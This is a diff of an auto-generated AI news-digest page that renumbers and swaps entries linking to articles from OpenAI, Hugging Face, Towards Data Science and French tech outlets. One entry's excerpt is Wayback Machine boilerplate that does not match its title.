+### 59. `EN` [OpenAI named Emerging Leader in Generative AI](data/articles/0ee69ec84e3309ca88e2a257f13122c4.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 OpenAI has been named an Emerging Leader in Gartner’s 2025 Innovation Guide for Generative AI Model Providers. The recognition reflects our enterprise momentum, with over 1 million companies building with ChatGPT.
 
@@ -845,7 +856,7 @@ OpenAI has been named an Emerging Leader in Gartner’s 2025 Innovation Guide fo
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="Hugging Face Blog">
 
-### 59. `EN` [How to Build a Healthcare Robot from Simulation to Deployment with NVIDIA Isaac for Healthcare](data/articles/c4aeff990b2385fc3ef945306d231e9a.html)
+### 60. `EN` [How to Build a Healthcare Robot from Simulation to Deployment with NVIDIA Isaac for Healthcare](data/articles/c4aeff990b2385fc3ef945306d231e9a.html)
 **Source:** Hugging Face Blog | **Keyword:** `AI`
 Back to Articles A hands-on guide to collecting data, training policies, and deploying autonomous medical robotics workflows on real hardware SO-ARM Starter Workflow; Building an Embodied Surgical Assistant Technical Implementation Sim-to-Real Mixed Training Approach Hardware Requirements Data Collection Implementation Simulation Teleoperation Controls Model Training Pipeline End-to-End Sim Collect–Train–Eval Pipelines Generate Synthetic Data in Simulation Train and Evaluate Policies Convert Models to TensorRT Getting Started Resources A hands-on guide to collecting data, training policies, and deploying autonomous medical robotics workflows on real hardware Simulation has been a cornerstone in medical imaging to address the data gap. However, in healthcare robotics until now, it's often been too slow, siloed, or difficult to translate into real-world systems. That’s now changing. With new advances in GPU-accelerated simulation and digital twins, developers can design, test, and validate robotic w
 
@@ -853,7 +864,7 @@ Back to Articles A hands-on guide to collecting data, training policies, and dep
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="Hugging Face Blog">
 
-### 60. `EN` [Voice Cloning with Consent](data/articles/e4cbf13488696e0deed63f3dc509d03e.html)
+### 61. `EN` [Voice Cloning with Consent](data/articles/e4cbf13488696e0deed63f3dc509d03e.html)
 **Source:** Hugging Face Blog | **Keyword:** `AI`
 Back to Articles Ethics in Practice: Consent as System Infrastructure The Technical Details Approach Unlocking the Voice Consent Gate In this blog post, we introduce the idea of a 'voice consent gate' to support voice cloning with consent. We provide an example Space and accompanying code to start the ball rolling on the idea.
 Realistic voice generation technology has gotten uncannily good in the past few years. In some situations, it’s possible to generate a synthetic voice that sounds almost exactly like the voice of a real person. And today, what once felt like science fiction is reality: Voice cloning. With just a few seconds of recorded speech, anyone’s voice can be made to say almost anything. Voice generation, and in particular the subtask of voice cloning, has notable risks and benefits. The risks of “deepfakes”, such as the cloned voice of former President Biden used in robocalls, can mislead people into thinking that people have said things that they haven’t said. On the other hand, voice cloning can be a powerful beneficial tool, helping people who’ve lost the ability to speak communicate in their own voice again, or assisting people in learning new languages and dialects.
@@ -863,7 +874,7 @@ So how do we create meaningful use
 
 <div class="article-item" data-lang="fr" data-category="ai" data-source="Hugging Face Blog">
 
-### 61. `FR` [Streaming datasets: 100x More Efficient](data/articles/69efa858b7d4dad088b218d0fe4cf6d8.html)
+### 62. `FR` [Streaming datasets: 100x More Efficient](data/articles/69efa858b7d4dad088b218d0fe4cf6d8.html)
 **Source:** Hugging Face Blog | **Keyword:** `IA`
 Back to Articles TLDR Streaming: The Same Easy API The Challenge: Streaming at Scale Under the Hood: What We Improved How are we faster than plain S3: Xet Need a custom streaming pipeline ? Push streaming to the limit Get Started and See the Difference TLDR We boosted load_dataset('dataset', streaming=True), streaming datasets without downloading them with one line of code!
 Start training on multi-TB datasets immediately, without complex setups, downloading, no "disk out of space", or 429 “stop requesting!” errors.It's super fast! Outrunning our local SSDs when training on 64xH100 with 256 workers downloading data.
@@ -873,7 +884,7 @@ We've improved streaming to have 100x fewer requests, → 10× faster data resol
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="Hugging Face Blog">
 
-### 62. `EN` [Sentence Transformers is joining Hugging Face!](data/articles/ff3cbd8a3bd98d11f0a0b18065d535ff.html)
+### 63. `EN` [Sentence Transformers is joining Hugging Face!](data/articles/ff3cbd8a3bd98d11f0a0b18065d535ff.html)
 **Source:** Hugging Face Blog | **Keyword:** `AI`
 Back to Articles Project History Acknowledgements Getting Started Today, we are announcing that Sentence Transformers is transitioning from Iryna Gurevych’s Ubiquitous Knowledge Processing (UKP) Lab at the TU Darmstadt to Hugging Face. Hugging Face's Tom Aarsen has already been maintaining the library since late 2023 and will continue to lead the project. At its new home, Sentence Transformers will benefit from Hugging Face's robust infrastructure, including continuous integration and testing, ensuring that it stays up-to-date with the latest advancements in Information Retrieval and Natural Language Processing.
 Sentence Transformers (a.k.a. SentenceBERT or SBERT) is a popular open-source library for generating high-quality embeddings that capture semantic meaning. Since its inception by Nils Reimers in 2019, Sentence Transformers has been widely adopted by researchers and practitioners for various natural language processing (NLP) tasks, including semantic search, semantic textual similarity, clustering, and paraphrase mining. After years of development and training by and for the community, over 16,000 Sentence Transformers models are publicly available on the Hugging Face Hub, serving more than a million monthly unique users.
@@ -883,7 +894,7 @@ Sentence Transformers (a.k.a. SentenceBERT or SBERT) is a popular open-source li
 
 <div class="article-item" data-lang="nl" data-category="ai" data-source="Hugging Face Blog">
 
-### 63. `EN` [Supercharge your OCR Pipelines with Open Models](data/articles/d74c14ff51b09c5a645ec2a0bb4a532c.html)
+### 64. `EN` [Supercharge your OCR Pipelines with Open Models](data/articles/d74c14ff51b09c5a645ec2a0bb4a532c.html)
 **Source:** Hugging Face Blog | **Keyword:** `AI`
 Back to Articles We have added Chandra and OlmOCR-2 to this blog, as well as OlmOCR Scores of the models TL;DR: The rise of powerful vision-language models has transformed document AI. Each model comes with unique strengths, making it tricky to choose the right one. Open-weight models offer better cost efficiency and privacy. To help you get started with them, we’ve put together this guide.
 In this guide, you’ll learn: The landscape of current models and their capabilities When to fine-tune models vs. use models out-of-the-box Key factors to consider when selecting a model for your use case How to move beyond OCR with multimodal retrieval and document QA By the end, you’ll know how to choose the right OCR model, start building with it, and gain deeper insights into document AI. Let’s go! Table-of-Contents Supercharge your OCR Pipelines with Open Models
@@ -907,15 +918,15 @@ Visual Document Ret
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="Hugging Face Blog">
 
-### 64. `EN` [AI for Food Allergies](data/articles/e1f0c29a70402c03d92347aa13a87a8c.html)
+### 65. `EN` [Scaleway on Hugging Face Inference Providers](data/articles/c8953e6e308ed1877d45b3af2d041935.html)
 **Source:** Hugging Face Blog | **Keyword:** `AI`
-Back to Articles Current State of The Art: Where AI Meets Food Allergy Research The need for data Collection release The Protein and Molecular Allergenicity Layer The Clinical, Immunological, and Therapeutic Layer The Food, Ingredient, and Regulatory Layer Accessing the collection What’s coming next? Final remarks Appendix SDAP 2.0: Structural Database of Allergenic Proteins DAVIS: Kinase inhibitor binding affinities QsarDB: repository for (Q)SAR models e-Drug3D Database Stanford Drug Data: Offsides/Twosides DrugCentral: open drug information repository MedKG: medical knowledge graph PDBBind+: protein-ligand binding database Human Metabolome Database (HMDB) Therapeutic Target Database Therapeutic Data Commons (TDC) STITCH: Chemical–Protein Interaction Database M3-20M Multi-Modal Molecule Dataset
+The Wayback Machine is an initiative of the Internet Archive, a 501(c)(3) non-profit, building a digital library of Internet sites and other cultural artifacts in digital form. Other projects include Open Library &amp; archive-it.org. Your use of the Wayback Machine is subject to the Internet Archive's Terms of Use.
 
 </div>
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="Hugging Face Blog">
 
-### 65. `EN` [Jupyter Agents: training LLMs to reason with notebooks](data/articles/6d0a334604ba5945433f7c37780471bb.html)
+### 66. `EN` [Jupyter Agents: training LLMs to reason with notebooks](data/articles/6d0a334604ba5945433f7c37780471bb.html)
 **Source:** Hugging Face Blog | **Keyword:** `AI`
 Back to Articles The past year has been all about giving LLMs more tools and autonomy to solve more complex and open ended tasks. The goal of the Jupyter Agent is to give the model the ultimate tool: code execution. A natural way to display multi-step code execution together with reasoning is within a Jupyter Notebook, which consists of code and markdown cells. So we built Jupyter Agent to act as an agent that can execute code directly inside a Jupyter notebook and use this environment to solve data analysis and data science tasks. Think of it like Cursor, but living natively inside your data science workflow.We built a demo of this vision with Qwen-3 Coder, currently one of the strongest coding models. This is a follow-up to our earlier work on jupyter-agent (v1).
 While large models are starting to show useful behavior, the key question is how we can continue improving them. To this end, we focus on strengthening smaller models to perform well on agentic data science tasks as they currently struggle to compete with the large models.
@@ -924,9 +935,18 @@ Let’s begin with the last step: select
 
 </div>
 
+<div class="article-item" data-lang="es" data-category="ai" data-source="Hugging Face Blog">
+
+### 67. `EN` [mmBERT: ModernBERT goes Multilingual](data/articles/03f3c0f73735e0d065aa18b587bc69d5.html)
+**Source:** Hugging Face Blog | **Keyword:** `AI`
+Back to Articles TL;DR Training Data Training Recipe and Novel Components Architecture Three-Phase Training Approach Novel Training Techniques Results Natural Language Understanding (NLU) Retrieval Performance Learning Languages in the Decay Phase Efficiency Improvements Usage Examples Fine-tuning Examples Encoders Model Family and Links TL;DR This blog post introduces mmBERT, a state-of-the-art massively multilingual encoder model trained on 3T+ tokens of text in over 1800 languages. It shows significant performance and speed improvements over previous multilingual models, being the first to improve upon XLM-R, while also developing new strategies for effectively learning low-resource languages. mmBERT builds upon ModernBERT for a blazingly fast architecture, and adds novel components to enable efficient multilingual learning.
+If you are interested in trying out the models yourself, some example boilerplate is available at the end o
+
+</div>
+
 <div class="article-item" data-lang="en" data-category="ai" data-source="Hugging Face Blog">
 
-### 66. `EN` [MCP for Research: How to Connect AI to Research Tools](data/articles/eaf4a179e68438b8ae437a5f7d641bf7.html)
+### 68. `EN` [MCP for Research: How to Connect AI to Research Tools](data/articles/eaf4a179e68438b8ae437a5f7d641bf7.html)
 **Source:** Hugging Face Blog | **Keyword:** `AI`
 Back to Articles Research Discovery: Three Layers of Abstraction 1. Manual Research 2. Scripted Tools 3. MCP Integration Setup and Usage Quick Setup Learn More Academic research involves frequent research discovery: finding papers, code, related models and datasets. This typically means switching between platforms like arXiv, GitHub, and Hugging Face, manually piecing together connections.
 The Model Context Protocol (MCP) is a standard that allows agentic models to communicate with external tools and data sources. For research discovery, this means AI can use research tools through natural language requests, automating platform switching and cross-referencing. Research Discovery: Three Layers of Abstraction Much like software development, research discovery can be framed in terms of layers of abstraction. 1. Manual Research At the lowest level of abstraction, researchers search manually and cross-reference by hand.
@@ -939,18 +959,9 @@ The Model Context Protocol (MCP) is a standard that allows agentic models to com
 
 </div>
 
-<div class="article-item" data-lang="en" data-category="ai" data-source="Hugging Face Blog">
-
-### 67. `EN` [Kimina-Prover: Applying Test-time RL Search on Large Formal Reasoning Models](data/articles/d3ffeb6bb40ec82d708cbc8f2e5ba97e.html)
-**Source:** Hugging Face Blog | **Keyword:** `AI`
-Back to Articles Numina &amp; Kimi Team Figure 1: Performance comparison of theorem proving models on the miniF2F-test dataset. We're excited to announce the release of Kimina-Prover-72B, our state-of-the-art theorem proving model trained with the Kimi k1.5[1] RL pipeline based on Qwen2.5-72B [2]. Alongside it, we are also releasing two distilled variants: Kimina-Prover-Distill-8B and 1.7B (based on Qwen3-8B and Qwen3-1.7B[3] respectively).
-Our key innovations include: Test-Time Reinforcement Learning Search: A trainable agentic proving framework that enables the model to recursively discover, combine and apply multiple lemmas to construct complex proofs, building on a novel lemma-enabled pattern. Error-Fixing Capability: Kimina-Prover can read and interpret Lean’s error messages and propose targeted fixes, demonstrating significantly higher sample efficiency compared to regenerating proofs from scratch. These advancements enable Kimina-Prover to solve challenging mathematical problems and surpass prior methods. As shown in Figure 1, on the widely used miniF2F ben
-
-</div>
-
 <div class="article-item" data-lang="fr" data-category="ai" data-source="Siecle Digital">
 
-### 68. `FR` [OpenAI recrute le créateur d’OpenClaw, l’IA qui agit à votre place sur l’ordinateur et dont tout le monde parle](data/articles/f4ac571ba1f6d72acc651eebdf252c08.html)
+### 69. `FR` [OpenAI recrute le créateur d’OpenClaw, l’IA qui agit à votre place sur l’ordinateur et dont tout le monde parle](data/articles/f4ac571ba1f6d72acc651eebdf252c08.html)
 **Source:** Siecle Digital | **Keyword:** `IA`
 Depuis l’arrivée des navigateurs IA comme Comet de Perplexity, le secteur de l’IA s’oriente vers des agents capables d’agir directement sur nos appareils, d’automatiser des tâches et même d’interagir avec des services tiers. C’est dans ce contexte que le créateur d’un projet devenu viral rejoint l’un des acteurs les plus influents du marché. En effet, […]
 
@@ -958,7 +969,7 @@ Depuis l’arrivée des navigateurs IA comme Comet de Perplexity, le secteur de 
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="Towards Data Science">
 
-### 69. `EN` [Building Cost-Efficient Agentic RAG on Long-Text Documents in SQL Tables](data/articles/72b4329bf39e290322133b1bf82a474a.html)
+### 70. `EN` [Building Cost-Efficient Agentic RAG on Long-Text Documents in SQL Tables](data/articles/72b4329bf39e290322133b1bf82a474a.html)
 **Source:** Towards Data Science | **Keyword:** `AI`
 Designing a hybrid SQL + vector retrieval system without schema changes, data migration, or performance trade-offs
 
@@ -966,7 +977,7 @@ Designing a hybrid SQL + vector retrieval system without schema changes, data mi
 
 <div class="article-item" data-lang="fr" data-category="ai" data-source="Numerama Tech">
 
-### 70. `FR` [« C’est un fiasco total », le code indigeste généré par IA épuise les modérateurs open-source](data/articles/974c22249948eae7bb2e0f6c6dcdfbfc.html)
+### 71. `FR` [« C’est un fiasco total », le code indigeste généré par IA épuise les modérateurs open-source](data/articles/974c22249948eae7bb2e0f6c6dcdfbfc.html)
 **Source:** Numerama Tech | **Keyword:** `IA`
 Dans un article publié le 18 février 2026, le média britannique The Register revient sur l'exaspération de nombreux modérateurs open source confrontés au fait de devoir vérifier et corriger des demandes de modification de code boostées par IA. Une gronde qui pousse bon nombre de projets à adopter des mesures de précaution.
 
@@ -974,7 +985,7 @@ Dans un article publié le 18 février 2026, le média britannique The Register 
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="TechCrunch AI">
 
-### 71. `EN` [Indian AI lab Sarvam’s new models are a major bet on the viability of open source AI](data/articles/2e342018df145a3f130d6bddc67723f4.html)
+### 72. `EN` [Indian AI lab Sarvam’s new models are a major bet on the viability of open source AI](data/articles/2e342018df145a3f130d6bddc67723f4.html)
 **Source:** TechCrunch AI | **Keyword:** `AI`
 The new lineup includes 30-billion- and 105-billion-parameter models; a text-to-speech model; a speech-to-text model; and a vision model to parse documents.
 
@@ -982,7 +993,7 @@ The new lineup includes 30-billion- and 105-billion-parameter models; a text-to-
 
 <div class="article-item" data-lang="fr" data-category="ai" data-source="Siecle Digital">
 
-### 72. `FR` [LinkedIn veut restaurer l’authenticité des échanges en sanctionnant les commentaires automatiques](data/articles/b0bf7b694f35a78a922b746d93e417b1.html)
+### 73. `FR` [LinkedIn veut restaurer l’authenticité des échanges en sanctionnant les commentaires automatiques](data/articles/b0bf7b694f35a78a922b746d93e417b1.html)
 **Source:** Siecle Digital | **Keyword:** `IA`
 Alors que les créateurs de contenu et les entreprises rivalisent pour capter l’attention, l’authenticité est devenue l’un des principaux enjeux des réseaux sociaux comme LinkedIn. Malheureusement, certaines pratiques sont venues fausser les règles du jeu, comme les « engagement pods« , ces groupes coordonnés qui s’organisent pour gonfler artificiellement la portée de leurs publications. Face à la […]
 
@@ -990,7 +1001,7 @@ Alors que les créateurs de contenu et les entreprises rivalisent pour capter l�
 
 <div class="article-item" data-lang="fr" data-category="ai" data-source="Siecle Digital">
 
-### 73. `FR` [ChatGPT va vérifier votre âge : ce qui va changer pour les utilisateurs](data/articles/a5126331dafedc260905378bd12f3f52.html)
+### 74. `FR` [ChatGPT va vérifier votre âge : ce qui va changer pour les utilisateurs](data/articles/a5126331dafedc260905378bd12f3f52.html)
 **Source:** Siecle Digital | **Keyword:** `IA`
 Après Discord il y a seulement quelques jours, c’est désormais au tour d’OpenAI d’annoncer un contrôle d’âge pour les utilisateurs européens de ChatGPT. La mesure, évoquée depuis plusieurs mois, devrait être déployée dans les prochaines semaines au sein de l’Union européenne. Officiellement, l’objectif est de mieux protéger les mineurs face à certains contenus sensibles générés […]
 
@@ -998,7 +1009,7 @@ Après Discord il y a seulement quelques jours, c’est désormais au tour d’O
 
 <div class="article-item" data-lang="fr" data-category="ai" data-source="Numerama Tech">
 
-### 74. `FR` [Dell piraté depuis 2024 : des espions chinois sont parvenus à infiltrer un produit phare du géant américain](data/articles/94a8e0929169c2de93c0d9e01cc67717.html)
+### 75. `FR` [Dell piraté depuis 2024 : des espions chinois sont parvenus à infiltrer un produit phare du géant américain](data/articles/94a8e0929169c2de93c0d9e01cc67717.html)
 **Source:** Numerama Tech | **Keyword:** `IA`
 Dans un article de blog publié le 17 février 2026, les chercheurs en cybersécurité de Mandiant et du Google Threat Intelligence Group (GTIG) tirent la sonnette d’alarme. Depuis 2024, un groupe de pirates informatiques soupçonné d’être soutenu par l’État chinois exploite discrètement une faille de sécurité critique dans Dell RecoverPoint for Virtual Machines, un produit largement utilisé dans les entreprises.
 
@@ -1006,7 +1017,7 @@ Dans un article de blog publié le 17 février 2026, les chercheurs en cybersé
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="Towards Data Science">
 
-### 75. `EN` [Advance Planning for AI Project Evaluation](data/articles/9bff5e658ea9f286db8fb85ab6e364bd.html)
+### 76. `EN` [Advance Planning for AI Project Evaluation](data/articles/9bff5e658ea9f286db8fb85ab6e364bd.html)
 **Source:** Towards Data Science | **Keyword:** `AI`
 The work to do before the work begins
 
@@ -1014,7 +1025,7 @@ The work to do before the work begins
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="Towards Data Science">
 
-### 76. `EN` [Building a LangGraph Agent from Scratch](data/articles/7f855f2366661c2e74fdde8aa0ee7ce3.html)
+### 77. `EN` [Building a LangGraph Agent from Scratch](data/articles/7f855f2366661c2e74fdde8aa0ee7ce3.html)
 **Source:** Towards Data Science | **Keyword:** `AI`
 Everything you need to know to get started
 
@@ -1022,7 +1033,7 @@ Everything you need to know to get started
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="Towards Data Science">
 
-### 77. `EN` [Iron Triangles: Powerful Tools for Analyzing Trade-Offs in AI Product Development](data/articles/6f387e8d76e6253c7da2b6e89bcb7461.html)
+### 78. `EN` [Iron Triangles: Powerful Tools for Analyzing Trade-Offs in AI Product Development](data/articles/6f387e8d76e6253c7da2b6e89bcb7461.html)
 **Source:** Towards Data Science | **Keyword:** `AI`
 Conceptual overview and practical guidance
 
@@ -1030,7 +1041,7 @@ Conceptual overview and practical guidance
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="MIT Technology Review">
 
-### 78. `EN` [Tuning into the future of collaboration](data/articles/75ce379157416fe35c0295544ca00720.html)
+### 79. `EN` [Tuning into the future of collaboration](data/articles/75ce379157416fe35c0295544ca00720.html)
 **Source:** MIT Technology Review | **Keyword:** `AI`
 When work went remote, the sound of business changed. What began as a scramble to make home offices functional has evolved into a revolution in how people hear and are heard. From education to enterprises, companies across industries have reimagined what clear, reliable communication can mean in a hybrid world. For major audio and communications…
 
@@ -1038,7 +1049,7 @@ When work went remote, the sound of business changed. What began as a scramble t
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="Towards Data Science">
 
-### 79. `EN` [The Strangest Bottleneck in Modern LLMs](data/articles/e80259a86029cf40f965a3b716e78025.html)
+### 80. `EN` [The Strangest Bottleneck in Modern LLMs](data/articles/e80259a86029cf40f965a3b716e78025.html)
 **Source:** Towards Data Science | **Keyword:** `AI`
 Why insanely fast GPUs still can’t make LLMs feel instant
 
@@ -1046,7 +1057,7 @@ Why insanely fast GPUs still can’t make LLMs feel instant
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="Towards Data Science">
 
-### 80. `EN` [The Evolving Role of the ML Engineer](data/articles/da03515cd9fc3b496b2f7e6f20259254.html)
+### 81. `EN` [The Evolving Role of the ML Engineer](data/articles/da03515cd9fc3b496b2f7e6f20259254.html)
 **Source:** Towards Data Science | **Keyword:** `AI`
 Stephanie Kirmer on the $200 billion investment bubble, how AI companies can rebuild trust, and how her day-to-day work changed with the rise of LLMs.
 
@@ -1054,7 +1065,7 @@ Stephanie Kirmer on the $200 billion investment bubble, how AI companies can reb
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="Towards Data Science">
 
-### 81. `EN` [AI in Multiple GPUs: Point-to-Point and Collective Operations](data/articles/d693e77237b4c215c280e60d0ea2f033.html)
+### 82. `EN` [AI in Multiple GPUs: Point-to-Point and Collective Operations](data/articles/d693e77237b4c215c280e60d0ea2f033.html)
 **Source:** Towards Data Science | **Keyword:** `AI`
 Learn PyTorch distributed operations for multi GPU AI workloads
 
@@ -1062,7 +1073,7 @@ Learn PyTorch distributed operations for multi GPU AI workloads
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 82. `EN` [Introducing Lockdown Mode and Elevated Risk labels in ChatGPT](data/articles/4fafadd15590fd4d21c4434e2d5d6cea.html)
+### 83. `EN` [Introducing Lockdown Mode and Elevated Risk labels in ChatGPT](data/articles/4fafadd15590fd4d21c4434e2d5d6cea.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 Introducing Lockdown Mode and Elevated Risk labels in ChatGPT to help organizations defend against prompt injection and AI-driven data exfiltration.
 
@@ -1070,7 +1081,7 @@ Introducing Lockdown Mode and Elevated Risk labels in ChatGPT to help organizati
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="Towards Data Science">
 
-### 83. `EN` [AI in Multiple GPUs: Understanding the Host and Device Paradigm](data/articles/e8238ef44e397312bdddfa3d85ed523a.html)
+### 84. `EN` [AI in Multiple GPUs: Understanding the Host and Device Paradigm](data/articles/e8238ef44e397312bdddfa3d85ed523a.html)
 **Source:** Towards Data Science | **Keyword:** `AI`
 Learn how CPU and GPUs interact in the host-device paradigm
 
@@ -1078,7 +1089,7 @@ Learn how CPU and GPUs interact in the host-device paradigm
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 84. `EN` [Introducing GPT-5.3-Codex-Spark](data/articles/882674348fab9ca8a4414208b8358584.html)
+### 85. `EN` [Introducing GPT-5.3-Codex-Spark](data/articles/882674348fab9ca8a4414208b8358584.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 Introducing GPT-5.3-Codex-Spark—our first real-time coding model. 15x faster generation, 128k context, now in research preview for ChatGPT Pro users.
 
@@ -1086,7 +1097,7 @@ Introducing GPT-5.3-Codex-Spark—our first real-time coding model. 15x faster g
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="Towards Data Science">
 
-### 85. `EN` [Building an AI Agent to Detect and Handle Anomalies in Time-Series Data](data/articles/e22dae28120f2e12ea241eb54150afca.html)
+### 86. `EN` [Building an AI Agent to Detect and Handle Anomalies in Time-Series Data](data/articles/e22dae28120f2e12ea241eb54150afca.html)
 **Source:** Towards Data Science | **Keyword:** `AI`
 Combining statistical detection with agentic decision-making
 
@@ -1094,7 +1105,7 @@ Combining statistical detection with agentic decision-making
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="Towards Data Science">
 
-### 86. `EN` [Not All RecSys Problems Are Created Equal](data/articles/69f37180ef78e6117fbacef1cbd1bd89.html)
+### 87. `EN` [Not All RecSys Problems Are Created Equal](data/articles/69f37180ef78e6117fbacef1cbd1bd89.html)
 **Source:** Towards Data Science | **Keyword:** `AI`
 How baseline strength, churn, and subjectivity determine complexity
 
@@ -1102,7 +1113,7 @@ How baseline strength, churn, and subjectivity determine complexity
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="Towards Data Science">
 
-### 87. `EN` [How to Model The Expected Value of Marketing Campaigns](data/articles/dff75a2d06dc2530e65859b90b17fb18.html)
+### 88. `EN` [How to Model The Expected Value of Marketing Campaigns](data/articles/dff75a2d06dc2530e65859b90b17fb18.html)
 **Source:** Towards Data Science | **Keyword:** `AI`
 The approach that takes companies to the next level of data maturity
 
@@ -1110,7 +1121,7 @@ The approach that takes companies to the next level of data maturity
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="Towards Data Science">
 
-### 88. `EN` [Implementing the Snake Game in Python](data/articles/ee24d6fda6d8a72a02675a9d770787bb.html)
+### 89. `EN` [Implementing the Snake Game in Python](data/articles/ee24d6fda6d8a72a02675a9d770787bb.html)
 **Source:** Towards Data Science | **Keyword:** `AI`
 An easy step-by-step guide to building the snake game from scratch
 
@@ -1118,7 +1129,7 @@ An easy step-by-step guide to building the snake game from scratch
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="Towards Data Science">
 
-### 89. `EN` [How to Personalize Claude Code](data/articles/5663171818a9541f6e20d76e28126643.html)
+### 90. `EN` [How to Personalize Claude Code](data/articles/5663171818a9541f6e20d76e28126643.html)
 **Source:** Towards Data Science | **Keyword:** `AI`
 Learn how to get more out of Claude code by giving it access to more information.
 
@@ -1126,7 +1137,7 @@ Learn how to get more out of Claude code by giving it access to more information
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 90. `EN` [Introducing OpenAI Frontier](data/articles/1a4bc4ca02801ab57687c64d1a12243a.html)
+### 91. `EN` [Introducing OpenAI Frontier](data/articles/1a4bc4ca02801ab57687c64d1a12243a.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 OpenAI Frontier is an enterprise platform for building, deploying, and managing AI agents with shared context, onboarding, permissions, and governance.
 
@@ -1134,7 +1145,7 @@ OpenAI Frontier is an enterprise platform for building, deploying, and managing 
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="Hugging Face Blog">
 
-### 91. `EN` [Community Evals: Because we're done trusting black-box leaderboards over the community](data/articles/54a2e4d63e7f2c9f9eeb830439ab32e8.html)
+### 92. `EN` [Community Evals: Because we're done trusting black-box leaderboards over the community](data/articles/54a2e4d63e7f2c9f9eeb830439ab32e8.html)
 **Source:** Hugging Face Blog | **Keyword:** `AI`
 Back to Articles Evaluation is broken What We're Shipping Why This Matters Get Started TL;DR: Benchmark datasets on Hugging Face can now host leaderboards. Models store their own eval scores. Everything links together. The community can submit results via PR. Verified badges prove that the results can be reproduced. Evaluation is broken Let's be real about where we are with evals in 2026. MMLU is saturated above 91%. GSM8K hit 94%+. HumanEval is conquered. Yet some models that ace benchmarks still can't reliably browse the web, write production code, or handle multi-step tasks without hallucinating, based on usage reports. There is a clear gap between benchmark scores and real-world performance.
 Furthermore, there is another gap within reported benchmark scores. Multiple sources report different results. From Model Cards, to papers, to evaluation platforms, there is no alignment in reported scores. The result is that the community lacks a single source of truth. What We're Shipping Decentralized and transparent evaluation reporting.
@@ -1144,15 +1155,29 @@ We are going to take evaluations on the Hugging Face Hub in a new direction by d
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 92. `EN` [Inside OpenAI’s in-house data agent](data/articles/6a15bb49ecb1445ff316e0f49654d051.html)
+### 93. `EN` [Inside OpenAI’s in-house data agent](data/articles/6a15bb49ecb1445ff316e0f49654d051.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 How OpenAI built an in-house AI data agent that uses GPT-5, Codex, and memory to reason over massive datasets and deliver reliable insights in minutes.
 
 </div>
 
+<div class="article-item" data-lang="en" data-category="ai" data-source="Hugging Face Blog">
+
+### 94. `EN` [Introducing Daggr: Chain apps programmatically, inspect visually](data/articles/46184e8114878523e89d93059ad5229f.html)
+**Source:** Hugging Face Blog | **Keyword:** `AI`
+Back to Articles Table of Contents Background Getting Started Node Types Sharing Your Workflows End-to-End Example with Different Nodes Next Steps TL;DR: Daggr is a new, open-source Python library for building AI workflows that connect Gradio apps, ML models, and custom functions. It automatically generates a visual canvas where you can inspect intermediate outputs, rerun individual steps, and manage state for complex pipelines, all in a few lines of Python code! Table of Contents Background
+Getting Started
+Sharing Your Workflows
+End-to-End Example with Different Nodes
+Next Steps Background If you've built AI applications that combine multiple models or processing steps, you know the pain: chaining API calls, debugging pipelines, and losing track of intermediate results. When something goes wrong in step 5 of a 10-step workflow, you often have to re-run everything just to see what happened.
+Most developers either build fragile scripts that are hard to debug or turn to heavy orchestration platforms designed for production pipelines—not rapid experimentation.
+We've been working on Daggr to solve p
+
+</div>
+
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 93. `EN` [The next chapter for AI in the EU](data/articles/b962872038b81871c262fff0244d8bb9.html)
+### 95. `EN` [The next chapter for AI in the EU](data/articles/b962872038b81871c262fff0244d8bb9.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 OpenAI launches the EU Economic Blueprint 2.0 with new data, partnerships, and initiatives to accelerate AI adoption, skills, and growth across Europe.
 
@@ -1160,7 +1185,7 @@ OpenAI launches the EU Economic Blueprint 2.0 with new data, partnerships, and i
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 94. `EN` [EMEA Youth &amp; Wellbeing Grant](data/articles/6a8d895b91c1509febaaf6682c49c57d.html)
+### 96. `EN` [EMEA Youth &amp; Wellbeing Grant](data/articles/6a8d895b91c1509febaaf6682c49c57d.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 Apply for the EMEA Youth &amp; Wellbeing Grant, a €500,000 program funding NGOs and researchers advancing youth safety and wellbeing in the age of AI.
 
@@ -1168,7 +1193,7 @@ Apply for the EMEA Youth &amp; Wellbeing Grant, a €500,000 program funding NGO
 
 <div class="article-item" data-lang="en" data-category="ai" data-source="OpenAI Blog">
 
-### 95. `EN` [Keeping your data safe when an AI agent clicks a link](data/articles/ce43bcebacd259570eab000b173650fe.html)
+### 97. `EN` [Keeping your data safe when an AI agent clicks a link](data/articles/ce43bcebacd259570eab000b173650fe.html)
 **Source:** OpenAI Blog | **Keyword:** `AI`
 Learn how OpenAI protects user data when AI agents open links, preventing URL-based data exfiltration and prompt injection with built-in safeguards.
 
